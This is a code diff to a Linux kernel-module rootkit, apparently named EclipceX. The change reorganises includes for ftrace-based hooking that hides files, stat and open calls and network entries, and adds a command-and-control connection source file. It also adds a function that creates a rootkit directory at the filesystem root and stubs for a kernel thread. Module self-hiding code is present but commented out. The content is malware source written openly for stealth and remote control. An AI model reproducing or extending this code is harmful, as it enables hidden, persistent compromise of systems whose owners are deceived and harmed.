@@ -9,14 +9,23 @@
 #include <linux/version.h>
 #include <linux/module.h>
 
-#include "resources/hooks.h"
-#include "resources/hide_files_functions.c"
+#include <linux/namei.h> // для создания директории
+#include <linux/mount.h>    // for mnt_idmap
 
-#include "resources/getdents.c"
-#include "resources/stat.c"
+#include <linux/kthread.h>   // kthread API
 
-#include "resources/openx.c"	
-#include "resources/ports.c"
+
+#include "src/hooks.h"
+#include "src/hide/filter_functions.c"
+
+#include "src/hide/filldir.c"
+// #include "src/hide/getdents.c"
+#include "src/hide/stat.c"
+
+#include "src/hide/openx.c"	
+#include "src/hide/net.c"
+
+#include "src/c2/conn_serv.c"
 
 
 MODULE_LICENSE("GPL");
@@ -190,9 +199,42 @@ void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
 #pragma GCC optimize("-fno-optimize-sibling-calls")
 #endif
 
-// скрывание модуля
+// скрытие модуля
 // static struct list_head *prev_module;
 // static short hidden = 0;
+
+static struct task_struct *thread;  // Указатель на поток
+
+int create_ex_dir(void);
+// Создать директорию под руткит
+int create_ex_dir(void) {
+	struct path parent_path;
+    struct dentry *dentry;
+    struct mnt_idmap *idmap;
+    int err;
+	char *dir_name = "ex_EclipceX";
+
+
+    err = kern_path("/", LOOKUP_DIRECTORY, &parent_path);
+    if (err)
+        return err;
+
+    dentry = lookup_one_len(dir_name, parent_path.dentry, strlen(dir_name));
+    if (IS_ERR(dentry)) {
+        path_put(&parent_path);
+        return PTR_ERR(dentry);
+    }
+
+    idmap = mnt_idmap(parent_path.mnt);  // получаем idmap для текущего mount namespace
+
+    err = vfs_mkdir(idmap, d_inode(parent_path.dentry), dentry, 0755);
+
+    dput(dentry);
+    path_put(&parent_path);
+
+    return err;
+}
+
 
 static int ex_init(void)
 {
@@ -208,6 +250,11 @@ static int ex_init(void)
 	if (err)
 		return err;
 
+    // Создаем поток
+    // thread = kthread_run(my_thread_function, NULL, "my_kthread");
+
+	// err = create_ex_dir();
+
 	pr_info("module loaded\n");
 
 	return 0;
@@ -217,11 +264,16 @@ static void ex_exit(void)
 {
     pr_info("module exit\n");
 
-	// скрывание модуля
+	// скрытие модуля
 	// list_add(&THIS_MODULE->list, prev_module);
     // hidden = 0;
 
 	fh_remove_hooks(EX_hooks, ARRAY_SIZE(EX_hooks));
+
+    // if (thread) {
+    //     printk(KERN_INFO "Ядро: остановка потока...\n");
+    //     kthread_stop(thread);
+    // }
 
 	pr_info("module unloaded\n");
 }
